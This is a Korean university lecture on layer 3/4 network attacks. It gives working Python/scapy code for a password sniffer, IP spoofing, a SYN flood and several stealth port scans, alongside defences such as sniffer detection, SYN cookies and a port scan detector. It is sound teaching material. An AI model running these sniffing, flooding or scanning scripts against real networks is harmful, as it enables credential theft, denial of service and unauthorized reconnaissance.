@@ -1,0 +1,1306 @@
+  Network Security
+Lecture 07: L3/4 attacks
+ Taejune Park (taejune.park@jnu.ac.kr)
+ School of Artificial Intelligence
+ Chonnam National University
+Goal
+‣ TCP/IP는 인터넷의 핵심을 형성하며 전 세계 대부분의 컴퓨터 네트워크를 작동시킵니다!
+
+
+
+‣ 스니퍼 및 PCAP 덤프
+
+‣ IP 스푸핑
+
+‣ SYN 플러딩
+
+‣ 포트 스캐닝
+
+‣ 및 TCP 세션 하이재킹
+
+
+
+
+                         2
+Sniffer and PCAP dump
+
+
+
+
+             3
+HTTP vs HTTPS
+‣ SSL은 오늘날 어디든 사용됨!
+
+‣ SSL이 없다면...?
+ •네트워크 스니퍼가 패킷을 아주 잘 읽을 수 있게되죠!
+
+
+
+
+                           4
+ Simple sniffer
+  ‣ pcapy를 통해 스니핑한 트래픽들을 pcap으로 저장하는 스니퍼 작성하기
+     •sudo apt-get install python3-pcapy
+
+#!/usr/bin/python3
+
+import sys
+import getopt                                                 # This function will be called for every packet
+import pcapy                                                  # and just print it
+from datetime import datetime                                 def handle_packet(hdr, data):
+from impacket.ImpactDecoder import EthDecoder                     print(decoder.decode(data))
+
+                                                              # Open device in promisc mode
+dev = "s1"                                                    pcap = pcapy.open_live(dev, 1500, 0, 100)
+filter = "tcp"
+decoder = EthDecoder()                                        # Set pcap filter
+                                                              pcap.setfilter(filter)
+def usage():
+    print(sys.argv[0] + " -i <dev> -f <pcap_filter>")         print("Listening on %s: net=%s, mask=%s, linktype=%d" % (dev,
+    sys.exit(1)                                               pcap.getnet(), pcap.getmask(), pcap.datalink()))
+
+# Parsing parameter                                           # Start sniffing
+try:                                                          #pcap.loop(-1, handle_packet)
+     cmd_opts = "f:i:"
+     opts, args = getopt.getopt(sys.argv[1:], cmd_opts)       # Set .pcap file's filename using datetime.
+except getopt.GetoptError:                                    filename = datetime.today().strftime("%Y%m%d%H%M%S")
+     usage()                                                  # Create .pcap file.
+                                                              dumper = pcap.dump_open("./%s.pcap" % filename)
+for opt in opts:
+    if opt[0] == "-f":                                        while True:
+        filter = opt[1]                                         hdr, pkt = pcap.next()
+    elif opt[0] == "-i":                                        handle_packet(hdr, pkt)
+        dev = opt[1]                                            dumper.dump(hdr, pkt)
+    else:
+        usage()
+
+
+
+                                                          5
+Promiscuous mode
+‣ NIC는 수신하는 모든 네트워크 패킷을 캡처하고 읽을 수 있게 해주는 모드
+ •패킷이 NIC 자체 주소로 향하는지 여부에 관계없이!
+
+‣ 이 모드는 일반적으로 네트워크 모니터링, 패킷 스니핑 및 문제 해결 목적으로 사용됨
+
+
+
+
+                            6
+                                               External net 10.10.10.30/24
+
+Test
+‣ Run it on the host for s1
+                                                                               10.10.10.33/24
+
+
+
+    http://testphp.vulnweb.com/login.php   10.10.10.31/24     10.10.10.32/24
+
+
+
+
+                                           7
+Reading PCAP files
+‣ Pcap을 pcapy를 통해 출력하기
+ •pcap을 자동적으로 분석할 수 있게 됩니다!
+ #!/usr/bin/python3
+                                                               def read_packet(hdr, data):
+ import sys                                                        ether = decoder.decode(data)
+ import getopt                                                     if ether.get_ether_type() == IP.ethertype:
+ import pcapy                                                          iphdr = ether.child()
+ from impacket.ImpactDecoder import EthDecoder                         transhdr = iphdr.child()
+ from impacket.ImpactPacket import IP, TCP, UDP
+                                                                       if iphdr.get_ip_p() == TCP.protocol:
+ decoder = EthDecoder()                                                    print(iphdr.get_ip_src() + ":" + \
+ input_file = None                                                               str(transhdr.get_th_sport()) + \
+ dump_file = "sniffer.pcap"                                                       " -> " + iphdr.get_ip_dst() + ":" + \
+                                                                                  str(transhdr.get_th_dport()))
+ def usage():                                                          elif iphdr.get_ip_p() == UDP.protocol:
+     print(sys.argv[0] + """                                               print(iphdr.get_ip_src() + ":" + \
+     -r <input_file>                                                             str(transhdr.get_uh_sport()) + \
+     """)                                                                         " -> " + iphdr.get_ip_dst() + ":" + \
+     sys.exit(1)                                                                  str(transhdr.get_uh_dport()))
+                                                                       else:
+ # Parse parameter                                                         print(iphdr.get_ip_src() + \
+ try:                                                                            " -> " + iphdr.get_ip_dst() + ": " + \
+      cmd_opts = "r:"                                                            str(transhdr))
+      opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+ except getopt.GetoptError:
+      usage()
+                                                               print("input file: %s"%input_file)
+ for opt in opts:
+     if opt[0] == "-r":                                        pcap = pcapy.open_offline(input_file)
+         input_file = opt[1]                                   #pcap.loop(0, read_packet)
+     else:
+         usage()                                               while True:
+                                                                 hdr, pkt = pcap.next()
+                                                                 read_packet(hdr, pkt)
+
+
+
+                                                           8
+Test
+
+
+
+
+       9
+The password sniffer
+‣ 암호화되지 않은 패킷에서 비밀번호와 같은 비밀 데이터를 검색할 수 있습니다!
+
+‣ 메시지 스트림에서 비밀번호 관련 텍스트를 필터링하여 자동으로 비밀번호를 가져오기
+ •비밀번호, 비밀번호, 패스, 비밀번호, 사용자, 접속....
+
+
+
+
+                              10
+Script
+#!/usr/bin/python3
+
+import sys
+import re
+import getopt
+import pcapy
+from impacket.ImpactDecoder import EthDecoder, IPDecoder,             if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and \
+TCPDecoder                                                                  not tcp_pkt.get_FIN() and match and \
+                                                                            match.groupdict()['found'] != None:
+# Interface to sniff on                                                   print("%s:%d -> %s:%d" % (ip_pkt.get_ip_src(),
+dev = "s1"                                                                                          tcp_pkt.get_th_sport(),
+                                                                                                    ip_pkt.get_ip_dst(),
+# Pcap filter                                                                                       tcp_pkt.get_th_dport()))
+filter = "tcp"                                                            print("\t%s\n" % (match.groupdict()['found']))
+
+# Decoder for all layers                                          def usage():
+eth_dec = EthDecoder()                                                print(sys.argv[0] + " -i <dev> -f <pcap_filter>")
+ip_dec = IPDecoder()                                                  sys.exit(1)
+tcp_dec = TCPDecoder()
+
+# Patterns that match usernames and passwords                     # Parsing parameter
+pattern = re.compile(r"""(?P<found>(USER|USERNAME|PASS|           try:
+                     PASSWORD|LOGIN|BENUTZER|PASSWORT|AUTH|            cmd_opts = "f:i:"
+                     ACCESS|ACCESS_?KEY|SESSION|                       opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+                     SESSION_?KEY|TOKEN)[=:\s].+)\b""",           except getopt.GetoptError:
+                     re.MULTILINE|re.IGNORECASE)                       usage()
+
+                                                                  for opt in opts:
+# This function will be called for every packet, decode it and        if opt[0] == "-f":
+# try to find a username or password in it                                filter = opt[1]
+def handle_packet(hdr, data):                                         elif opt[0] == "-i":
+    eth_pkt = eth_dec.decode(data)                                        dev = opt[1]
+    ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())              else:
+    tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())                 usage()
+    payload = tcp_pkt.get_data_as_string()
+    match = None                                                  # Start sniffing
+                                                                  pcap = pcapy.open_live(dev, 1500, 0, 100)
+    try:                                                          pcap.setfilter(filter)
+        match = re.search(pattern, payload.decode())              print("Sniffing passwords on " + str(dev))
+    except (UnicodeError, AttributeError):                        #pcap.loop(0, handle_packet)
+        # We got encrypted or otherwise binary data
+        None;                                                     while True:
+                                                                    hdr, pkt = pcap.next()
+                                                                    handle_packet(hdr, pkt)
+
+
+
+                                                                 11
+Test
+
+
+
+
+       12
+Sniffer Detection
+‣ 악성 스니퍼는 네트워크 보안에 실질적인 위협이 될 수 있습니다!
+
+‣ 찾기는 매우 쉬워요!
+  → 로컬에서는 그냥 인터페이스들이 PROMISC가 켜져있는지 확인하면 됩니다.
+ •$ ifconfig -a | grep PROMISC
+
+
+
+
+ •sudo dmesg | grep promisc (or sudo cat /dev/kmsg | grep promisc)
+
+
+
+
+                                          13
+원격지 에서는...
+‣ 1. 응답 시간 측정하기
+ •연결된 모든 호스트를 지속적으로 핑
+ •스니퍼는 트래픽을 디코딩하는 데 더 많은 CPU를 사용하기 때문에 응답 속도가 느려짐
+
+‣ 2. 무작위 ARP를 전송하고 응답 확인
+ •무차별 모드는 어떤 패킷도 거부하지 않고 모든 패킷에 반응함!
+ •프로미스 모드로 실행되지 않는 시스템은 MAC 주소가 아닌 패킷을 삭제하지만 스니핑 시스템은 응
+  답을 보냄!
+
+
+                                #!/usr/bin/python3
+                                import sys
+                                from scapy.all import promiscping
+
+                                if len(sys.argv) < 2:
+                                  print(sys.argv[0] + " <net>")
+                                  sys.exit()
+
+                                promiscping(sys.argv[1])
+
+
+
+
+                           14
+IP Spoofing
+
+
+
+
+              15
+IP Spoofing
+‣ IP 주소 위조.
+
+‣ 소스 주소는 패킷이 전송된 실제 네트워크 디바이스의 IP가 아니라 수동으로 삽입된 주소
+
+‣ 공격자는 공격의 출처를 숨기기 위해 이 기법을 사용
+
+‣ 소스 IP 주소에 따라 연결을 차단하거나 허용하는 패킷 필터 또는 tcp 래퍼와 같은
+  기타 보안 계층을 우회하기 위해 (보안 기능 우회)
+
+
+                        h1
+
+                                                                      h2
+                To: h3
+            From: h1 h2
+Message: Please send me packets a lot!
+                                         h3        Packets to h2 from h3
+
+
+
+
+                                              16
+Script
+                                #!/usr/bin/python3
+‣ (스푸핑 된 ip에 대한 응답을 획득하기        import sys
+                                from scapy.all import send, IP, ICMP
+  위해서는 MitM이 선행되어야 함)
+                                if len(sys.argv) < 3:
+                                  print(sys.argv[0] + " <src_ip> <dst_ip>")
+                                  sys.exit(1)
+
+                                packet = IP(src=sys.argv[1], dst=sys.argv[2]) / ICMP()
+                                answer = send(packet)
+                                if answer:
+                                  answer.show()
+
+
+
+
+                                                                 h3
+
+
+
+
+                                                  h2
+
+                           17
+SYN Flooding attack
+IP 스푸핑이 어떻게 활용될 수 있는지 보여주는 가장 대표적인 예!
+
+
+
+
+                        18
+TCP 3-way handshaking
+‣ 클라이언트와 서버 간의 연결(즉, 세션)을 설정하는 데 사용되는 프로세스
+  •TCP를 사용하는 통신에서 이 프로세스는 통신이 시작되기 전에 발
+  •TCP 연결이 설정되면 각 호스트는 동기화, 확인 또는 창 크기 정보를 유지하고 추적
+   → 이를 'Stateful'이라고 합니다.
+
+‣ TCP 3-way handshaking의 구조적 한계
+
+
+
+                                                                 Listen
+
+                    SYN-sent       SEQ (1000) ACK(-
+                                                      ---)
+                                                                               Assume SYN
+  Assume SYN                                                                 starts from 2000
+starts from 1000                                              SYN-Received
+                                               CK(1001)
+                                 SEQ (2000), A
+
+                   Established      SEQ(1001) ACK (2
+                                                       001)
+                                                               Established
+
+
+                                             19
+In this context...
+‣ 발신자가 서버에 ACK를 다시 보내지 않으면 어떻게 되나요?
+  •서버는 시간 초과가 될 때까지 응답을 기다려야 함!
+
+‣ 공격 전략
+  •서버의 연결을 시간 초과로 닫는 것보다 더 많이 엽니다(즉, Half-opened 상태).
+  •너무 많은 연결이 반개방 상태에 있으면 호스트가 더 이상의 연결을 수락하지 않음....!
+
+    ⇒ syn_backlog 큐를 채워보자
+
+                                                                 Listen
+
+                    SYN-sent       SEQ (1000) ACK(-
+                                                      ---)
+                                                                                 Assume SYN
+  Assume SYN                                                                   starts from 2000
+starts from 1000                                             SYN-Received
+                                               CK(1001)
+                                 SEQ (2000), A
+
+                   Established     SYN(1001)
+
+                                                             Established...?
+
+
+
+                                             20
+Script
+‣ 먼저 SYN cookie를 꺼주세요...!
+ •# echo 0 > /proc/sys/net/ipv4/tcp_syncookies
+           #!/usr/bin/python3
+
+           import sys
+           from scapy.all import *
+
+           if len(sys.argv) < 3:
+             print(sys.argv[0] + " <target ip> <target port>")
+             sys.exit(0)
+
+           packet = IP(src=RandIP("10.10.10.1/24"), dst=sys.argv[1]) / \
+                    TCP(sport=RandShort() , dport=int(sys.argv[2]), flags="S")
+
+           srflood(packet)
+
+
+‣ 그리고 테스트 서버를 ncat을 통해 준비
+ •# ncat -l -p 12345 // ncat 10.10.10.32 12345
+
+
+
+
+                                                   21
+Test
+
+
+            attacker
+
+
+
+
+       22
+Result
+‣ 서버: netstat -nta
+
+
+
+
+‣ 더이상 서버에 접속을 하지 못함!
+
+
+
+
+                       23
+사실 SYN flooding은 오늘날 더 안먹혀요...
+‣ 왜...?! 보안 역사상 가장 완벽한/아름다운 솔루션이 등장하였거든요...! SYN Cookie
+
+‣ Linux에서는 다음을 실행하여 SYN cookie를 활성화할 수 있습니다
+  •echo 1 > /proc/sys/net/ipv4/tcp_syncookies
+
+
+
+
+‣ 그래서 SYN cookie가 뭘까?
+  •3-way handshaking 중, 서버가 의도를 가질 수 있는 부분은?
+                                                                 Listen
+
+                    SYN-sent       SEQ (1000) ACK(-
+                                                      ---)
+                                                                               Assume SYN
+  Assume SYN                                                                 starts from 2000
+starts from 1000                                              SYN-Received
+                                               CK(1001)
+                                 SEQ (2000), A
+
+                   Established      SEQ(1001) ACK (2
+                                                       001)
+                                                               Established
+
+
+                                             24
+TCP SYN cookie
+‣ SYN 플러드 공격에 저항하는 데 사용되는 기술입니다(거의 100%! 근데 심플!).
+
+‣ Invented by Daniel J. Bernstein
+
+‣ Half-opened 상태를 발신자에게 마이그레이션! → 어떻게?!
+
+‣ SYN번호는 랜덤한 번호로 시작...! ⇒ 이를 Ack번호로 부터 유도하자
+ •서버의 SYN 넘버는 'HASH(SYN)'
+ •이후 클라이언트의 ACK는 'HASH(SYN)+1'
+  → 이는 클라이언트의 SYN에서 다시 계산할 수 있는 값...!
+                                                                               Listen
+
+                    SYN-sent             SEQ (1000) ACK(-
+                                                            ---)
+                                                                                             Assume SYN
+  Assume SYN                                                                               starts from 2000
+starts from 1000                                                            SYN-Received
+                                           H (10 0 0) ), A CK( 1001 )
+                                 SEQ ( HAS
+
+                   Established    SEQ( 1001 ) ACK
+                                                     ( HASH(1000) + 1
+                                                                        )
+                                                                             Established
+
+
+                                                   25
+                                         Here, we assume the hash function as HASH(x) = (x + 12345)%10000
+
+
+
+
+증명
+‣ 클라이언트는 [S 1000 / A ----] SYN을 전송
+
+‣ 서버는 다음을 포함하는 SYN/ACK을 반환
+ •Get the hash(1000) = 3345
+ •Send it as its ACK value, i.e., [3345 / 1001]
+
+‣ 클라이언트는 ACK [1001 / 3346] 반환
+
+‣ 'ack' 패킷을 수신한 후 서버는 ACK 값의 유효성을 검사합니다.
+ •Get the hash(SYN-1), i.e., hash(1001-1) = 3345.
+ •Compare it with 'ack-1', i.e., (3346-1) == 3345.
+ •동일한 경우 이 세션이 올바른 세션으로 판단할 수 있습니다.
+
+
+
+‣ 서버는 값을 저장할 필요 없이 핸드셰이킹 프로세스를 처리할 수 있습니다.
+
+‣ 클라이언트가 해시 함수를 추측할 수 있다면 어떨까요?
+                                              26
+Port scanning
+Information gathering를 위한 초기 단계
+
+
+
+
+                                  27
+About port numbers...
+‣ 컴퓨터 네트워크에서 실행되는 특정 프로세스 또는 서비스에 할당된 숫자 식별자
+ •네트워크 관점에서 보면 일종의 프로세스 식별자
+   → 네트워크 트래픽을 의도한 목적지로 라우팅하는 데 사용
+
+ •TCP/IP 기반 네트워크에서 각 서비스는 고유한 포트 번호를 사용하여 통신
+
+‣ 0-65535 (2bytes)의 범위
+ •Well-known ports (0-1023)
+   - 20/21(FTP), 22(SSH), 23(Telnet), 25(SMTP), 53(DNS), 80(HTTP), 88(Kerberos), 123(NTP),
+     135(DHCP), 179(BGP), 194(IRC), 443(HTTPS), 515(LDP)
+
+ •Registered ports (1024-49151): used by applications and services that have been officially registered
+   - 1119(Battle.net), 1194(Open VPN), 1293(IPsec), 1701(L2TP), 1723(PPTP), 2375/2376(Docker),
+     3479/3480(PlayStation), 4195(AWS).........
+
+ •Dynamic/Private ports (49152-65535): used by client programs temporarily.
+
+
+
+
+                                                  28
+Port scanning
+‣ 컴퓨터 또는 네트워크 장치에서 열려 있는 포트와 서비스를 검색하는 데 사용
+  → 해당 포트 뒤에서 어떤 서비스 또는 애플리케이션이 실행되고 있는지 파악
+ •네트워크 보안 평가, 취약성 평가, 모의 침투 테스트.
+ •해커가 악의적인 공격을 수행하기 위해 취약점을 찾는 과정에서 수행하는 사전 작업!
+
+
+
+
+                            29
+How to?
+‣ 어쩌긴... 그냥 다 해보는거지....!!
+ •3-way handshake 이 완료되면, 연결이 설정됨
+  → 즉, 포트가 열려있다!
+ •서버가 SYN-ACK 대신 RST로 응답하면 서버에서 포트가 닫혀있다는 의미
+
+              #! /usr/bin/python3
+
+              import socket, sys
+
+              if len(sys.argv) < 2:
+                print(sys.argv[0] + " <target ip>")
+                sys.exit(0)
+
+
+              for i in range(0, 65536):
+                PORT = i
+                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                sock.settimeout(10)
+                try:
+                  sock.connect((sys.argv[1], PORT))
+                  sock.close()
+                  print("%5d: Opened"%PORT)
+
+                except ConnectionRefusedError or socket.timeout:
+                  print("%5d: Closed"%PORT)
+
+
+
+
+                                            30
+Result
+‣ 테스트 전에 특정 포트를 열어두세요... ncat를 활용!
+ •e.g., ncat -l -p 1001
+
+
+
+
+                                     On h2
+
+
+
+
+                           31
+그런데 뭔가 이상
+‣ 스캔을 다시 한 번 수행하면 열려 있던 포트가 이제 닫힙니다!
+
+‣ 왜?
+ •ncat이 스캐너와 연결한 다음 스캐너가
+  연결을 닫으면서 작업을 완료함.
+ •따라서 포트가 더 이상 열려 있지 않게됨
+
+
+
+
+‣ 이것이 의미하는 바는...?!
+
+
+
+
+                           32
+TCP connect scan;
+넵, 이건 시끄럽습니다...!
+‣ TCP 연결 스캔은 가장 간단하고 안정적인 포트 스캔 유형
+
+‣ 핸드셰이킹을 완료하여 완전한 TCP 연결을 시도
+ •각 포트에 TCP SYN 패킷을 보내고 응답을 기다림
+ •포트가 열려 있으면 대상은 TCP SYN-ACK 패킷을 다시 보냄
+ • 그런 다음 스캐너는 연결을 닫기 위해 TCP RST 패킷을 보냄
+ •포트가 닫히면 대상은 연결 거부를 나타내는 TCP RST 패킷을 다시 보냄
+
+‣ 핸드셰이킹이 완료되면 피해 시스템에 로그가 남습니다!
+
+
+
+
+              ACK
+
+
+
+
+                             33
+Stealth scanning
+‣ 시스템에 로그를 남기지 않고 대상 시스템의 포트 상태를 검색
+  •보안 조치 우회 및 탐지 회피
+
+
+
+‣ TCP SYN Scan (= TCP Half Open Scan)
+
+‣ TCP FIN Scan
+  •TCP XMAS Scan
+  •TCP NULL Scan
+
+‣ TCP Ack Scan
+
+‣ UDP scan...
+
+‣ ...
+
+
+
+                                        34
+TCP SYN Scan
+‣ 대상의 각 포트에 TCP SYN 패킷을 보내고 응답을 기다리지만 핸드셰이크가 완료되지 않음
+ •포트가 열려있으면, 대상은 TCP SYN-ACK packet를 전송 (연결을 맺을 의향이 있음)
+  - 그러면 스캐너는 응답을 무시하고 연결을 닫기 위해 TCP RST 패킷을 보내지 않음
+    → 이렇게 하면 대상은 반개방 상태로 남아 최종 ACK 패킷을 기다리게 됨
+
+ •포트가 닫혀있으면, 타겟은 TCP RST 를전송 (연결을 안맺음)
+
+‣ 탐지하기 어렵고 일부 보안 장치를 우회할 수 있음.
+
+
+
+
+                       waiting...
+                                    35
+TCP SYN Scan
+‣ sr1( IP(dst=dst_ip)/ TCP(sport=src_port, dport=dst_port,flags="S"),
+     timeout=10, verbose=0)
+          from scapy.all import *
+          import sys
+
+          if len(sys.argv) < 2:
+            print(sys.argv[0] + " <target ip>")
+            sys.exit(0)
+
+          dst_ip = sys.argv[1]
+
+          for i in range(1000, 1005):
+            dst_port = i
+            src_port = RandShort()
+            scan_resp = sr1( IP(dst=dst_ip)/\
+                                      TCP(sport=src_port, dport=dst_port,flags="S"),\
+                                      timeout=10, verbose=0
+                           )
+
+            if type(scan_resp) == type(None):
+              print("%5d: Filtered"%dst_port)
+
+            elif scan_resp.haslayer(TCP):
+              if scan_resp.getlayer(TCP).flags == 0x12:
+                send_rst = sr(IP(dst=dst_ip)/\
+                              TCP(sport=src_port,dport=dst_port,flags="R"),\
+                              timeout=0, verbose=0)
+                print("%5d: Opened"%dst_port)
+              elif scan_resp.getlayer(TCP).flags == 0x14:
+                print("%5d: Closed"%dst_port)
+
+                                                  36
+Result
+
+
+
+
+         37
+Weakness and strength points
+‣ 연결 스캔보다 더 은밀하고 빠르지만 몇 가지 제한 사항이 있습니다!
+
+
+
+‣ Logging
+ •최신 보안 서비스는 Half-open state에 대한 로그를 남김
+
+‣ Anomaly detection
+ •많은 Half-opened 상태는 명백한 비정상 상황!
+ •보안 서비스들은 이를 손쉽게 파악가능...!
+
+
+
+‣ 그러나 이를 완벽하게 막기는 어렵습니다...!
+ •왜.....?
+
+
+
+
+                               38
+TCP FIN Scan
+‣ 좀 더 은밀...!
+
+‣ 사전 연결 없이 FIN 패킷을 전송할 수 있도록 허용하는 TCP의 제한을 악용...!
+
+‣ 대상의 각 포트에 TCP FIN 패킷을 전송하고 응답을 기다림
+ •포트가 열려 있거나 필터링된 경우, 대상은 패킷을 무시하고 응답을 보내지 않음
+ •포트가 닫혀 있으면 대상은 오류를 나타내는 TCP RST 패킷을 다시 보냄.
+
+
+
+
+                            39
+TCP FIN Scan
+
+      from scapy.all import *
+      import sys
+
+      if len(sys.argv) < 2:
+        print(sys.argv[0] + " <target ip>")
+        sys.exit(0)
+
+      dst_ip = sys.argv[1]
+
+      for i in range(1000, 1005):
+        dst_port = i
+        src_port = RandShort()
+        scan_resp = sr1( IP(dst=dst_ip)/\
+                                  TCP(sport=src_port, dport=dst_port, flags="F"),\
+                                  timeout=10, verbose=0
+                       )
+
+        if type(scan_resp) == type(None) :
+          print("%5d: Opened or Filtered"%dst_port)
+
+        elif scan_resp.haslayer(TCP):
+          if scan_resp.getlayer(TCP).flags == 0x14:
+            print("%5d: Closed"%dst_port)
+
+
+
+
+                                              40
+Result
+
+
+
+
+         41
+TCP Xmas Scan
+‣ TCP FIN의 변형
+
+‣ 대상의 각 포트에 여러 플래그가 설정된 TCP 패킷을 전송하고 응답을 기다림
+ •FIN, PSH, URG, 플래그를 동시에 활용... 마치 크리스마스 트리처럼...!
+ •포트가 열려 있거나 필터링된 경우, 타겟은 패킷을 무시하고 응답을 보내지 않음
+ •포트가 닫혀 있으면 대상은 오류를 나타내는 TCP RST 패킷을 다시 보냄
+
+
+
+
+                                42
+TCP XMAS Scan
+
+      from scapy.all import *
+      import sys
+
+      if len(sys.argv) < 2:
+        print(sys.argv[0] + " <target ip>")
+        sys.exit(0)
+
+      dst_ip = sys.argv[1]
+
+      for i in range(1000, 1005):
+        dst_port = i
+        src_port = RandShort()
+        scan_resp = sr1( IP(dst=dst_ip)/\
+                                  TCP(sport=src_port, dport=dst_port, flags="FPU"),\
+                                  timeout=10, verbose=0
+                       )
+
+        if type(scan_resp) == type(None) :
+          print("%5d: Opened or Filtered"%dst_port)
+
+        elif scan_resp.haslayer(TCP):
+          if scan_resp.getlayer(TCP).flags == 0x14:
+            print("%5d: Closed"%dst_port)
+
+
+
+
+                                              43
+Result
+
+
+
+
+         44
+TCP NULL Scan
+‣ FIN scan 버전 2
+
+‣ 아무런 플래그 없이 TCP를 보내기...! (확실히 이상한!!!)
+ •포트가 열려 있거나 필터링된 경우, 타겟은 패킷을 무시하고 응답을 보내지 않음
+ •포트가 닫혀 있으면 대상은 오류를 나타내는 TCP RST 패킷을 다시 보냄
+
+
+
+
+                            45
+TCP Null Scan
+
+       from scapy.all import *
+       import sys
+
+       if len(sys.argv) < 2:
+         print(sys.argv[0] + " <target ip>")
+         sys.exit(0)
+
+       dst_ip = sys.argv[1]
+
+       for i in range(1000, 1005):
+         dst_port = i
+         src_port = RandShort()
+         scan_resp = sr1( IP(dst=dst_ip)/\
+                                   TCP(sport=src_port, dport=dst_port, flags=""),\
+                                   timeout=10, verbose=0
+                        )
+
+         if type(scan_resp) == type(None) :
+           print("%5d: Opened or Filtered"%dst_port)
+
+         elif scan_resp.haslayer(TCP):
+           if scan_resp.getlayer(TCP).flags == 0x14:
+             print("%5d: Closed"%dst_port)
+
+
+
+
+                                               46
+Result
+
+
+
+
+         47
+Weakness and strength points of FIN/XMAS/NULL
+‣ Easy to filter
+  •보통의 경우 FIN등으로 패킷을 시작할 수가 없음...!
+  •확실히 비정상적인 플래그이므로 탐지가 쉬움.
+
+‣ Accuracy
+  •만약 모든 핀 패킷에 응답하거나, 모두 무시한다면...?! False positive/negative
+
+‣ Time consumption
+  •응답이 없다는 확신이 들 때 까지...억지로 좀 기다려야함...
+
+
+
+‣ Covertness
+  •매우 은밀합니다...!
+
+‣ Accuracy
+  •특정 경우에는 더욱 정확한 결과를 제공하기도 함.
+
+                                   48
+TCP ACK Scan
+‣ 대상의 방화벽 또는 필터 상태를 확인합니다.
+ •이 검사는 포트의 상태(opened/closed)는 알려주지 않음
+ •방화벽 또는 필터의 규칙과 정책을 매핑하는 데 도움을 줌.
+
+‣ 대상의 각 포트에 임의의 시퀀스 번호가 포함된 TCP ACK 패킷을 전송하고 응답을 대기
+ •포트가 필터링된 경우 대상은 응답을 보내지 않거나 패킷을 드랍.
+ •포트가 필터링되지 않은 경우, 대상은 잘못된 ACK를 나타내는 TCP RST 패킷을 다시 보냄.
+
+
+
+
+                              49
+TCP ACK Scan
+
+      from scapy.all import *
+      import sys
+
+      if len(sys.argv) < 2:
+        print(sys.argv[0] + " <target ip>")
+        sys.exit(0)
+
+      dst_ip = sys.argv[1]
+
+      for i in range(1000, 1005):
+        dst_port = i
+        src_port = RandShort()
+        scan_resp = sr1( IP(dst=dst_ip)/\
+                                  TCP(sport=src_port, dport=dst_port, flags="A"),\
+                                  timeout=10, verbose=0
+                       )
+
+        if type(scan_resp) == type(None) :
+          print("%5d: Filtered"%dst_port)
+
+        elif scan_resp.haslayer(TCP):
+          if scan_resp.getlayer(TCP).flags == 0x4:
+            print("%5d: Unfiltered"%dst_port)
+
+
+
+
+                                              50
+Why ACK?
+‣ 보안 서비스가 Stateless 한 경우에 유용함
+
+‣ 만약 stateless 하다면...
+ •포트 번호를 기준으로 차단은 하지만,
+  나가는 연결에 대한 응답으로 전송될 수 있기 때문에 들어오는 ACK 패킷만 차단할 수는 없게됨...!
+
+‣ 만약 stateful 하다면
+ •들어오는 ACK 패킷이 이미 설정된 발신 연결의 일부인지 확인할 수 있음.
+  → 요청하지 않은 패킷(설정되지 않음)인 경우에만 패킷을 차단하게됨
+
+
+
+‣ 따라서 ACK 검사에서 일부 포트가 다음과 같이 표시되면
+ •Filtered → stateful 방화벽일 가능성이 높음
+ •Unfiltered → stateless 방화벽일 확률이 높음
+
+
+
+
+                                     51
+UDP Scan
+‣ UDP는 Connectionless 프로토콜
+ •포트가 (항상) 열려있다고 잘못 보고 하게 됨
+ •그래서 응답이 없다라는 상태 등으로 분석.
+
+‣ 대상의 각 포트에 UDP 패킷을 전송하고 응답을 대기
+ •포트가 열려 있거나 필터링된 경우, 대상은 UDP 패킷을 다시 보내거나 패킷을 무시
+ •포트가 닫히면 대상은 유형 3과 코드 3이 포함된 ICMP 패킷을 다시 보냄
+  - ICMP Port Unreachable 수신: Closed일 확률이 높음
+  - ICMP Unreachable 수신: Filtered일 확률이 높음
+
+
+
+
+                                            52
+UDP Scan
+
+ from scapy.all import *
+ import sys
+
+ if len(sys.argv) < 2:
+   print(sys.argv[0] + " <target ip>")
+   sys.exit(0)
+
+ dst_ip = sys.argv[1]
+
+ for i in range(1000, 1005):
+   dst_port = i
+   src_port = RandShort()
+   scan_resp = sr1( IP(dst=dst_ip)/\
+                    UDP(sport=src_port, dport=dst_port),\
+                    timeout=10, verbose=0
+                  )
+
+   if type(scan_resp) == type(None) :
+     print("%5d: Open or Filtered"%dst_port)
+
+   elif scan_resp.haslayer(UDP) :
+     print("%5d: Open"%dst_port)
+
+   elif scan_resp.haslayer(ICMP):
+     if int(scan_resp.getlayer(ICMP).type) == 0x3 and   int(scan_resp.getlayer(ICMP).code) == 0x3 :
+       print("%5d: Closed"%dst_port)
+
+
+
+
+                                                  53
+Result
+
+
+
+
+         54
+Scanning detection
+‣ Traffic characteristics
+  •스캔 트래픽의 방향이 수평이 아닌 수직
+  •일반적으로 히트 되지 않아야 하는 포트가 히트됨
+
+
+
+       Normal traffic                          Server
+
+
+
+
+                            Scanning traffic   Server
+
+
+
+
+                                    55
+Countermeasure:
+Port scanning detector
+#!/usr/bin/python3
+
+import sys
+from time import time
+from scapy.all import sniff
+
+ip_to_ports = dict()
+
+# Nr of ports in timespan seconds
+nr_of_diff_ports = 3
+portscan_timespan = 100
+
+def detect_portscan(packet):
+    ip = packet.getlayer("IP")
+    tcp = packet.getlayer("TCP")
+
+    # Remember scanned port and time in unix format
+    ip_to_ports.setdefault(ip.src, {})\
+               [str(tcp.dport)] = int(time())
+
+    # Source IP has scanned too much different ports?
+    if len(ip_to_ports[ip.src]) >= nr_of_diff_ports:
+        scanned_ports = ip_to_ports[ip.src].items()
+
+        # Check recorded time of each scan
+        for (scanned_port, scan_time) in scanned_ports:
+
+            # Scanned port not in timeout span? Delete it
+            if scan_time + portscan_timespan < int(time()):
+                del ip_to_ports[ip.src][scanned_port]
+
+        # Still too much scanned ports?
+        if len(ip_to_ports[ip.src]) >= nr_of_diff_ports:
+            print("Portscan detected from " + ip.src)
+            print("Scanned ports " + ",".join(ip_to_ports[ip.src].keys()) + "\n")
+
+            del ip_to_ports[ip.src]
+
+if len(sys.argv) < 2:
+    print(sys.argv[0] + " <iface>")
+    sys.exit(0)
+                                                                                    And, any other anomaly detection
+sniff(prn=detect_portscan, filter="tcp", iface=sys.argv[1], store=0)
+                                                                                               technique is available!
+                                                                   56
+One more step,
+‣ 포트 스캔을 기록할 뿐만 아니라 차단할 수도 있습니다!
+  → 스캔 소스 IP에 대한 거부 또는 드롭 규칙을 iptables에 추가
+       os.system("iptables -A INPUT -s " + ip_to_ports[ip.src] + " -j DROP")
+
+
+
+
+‣ 하지만 이 기술은 위험할 수 있습니다...!
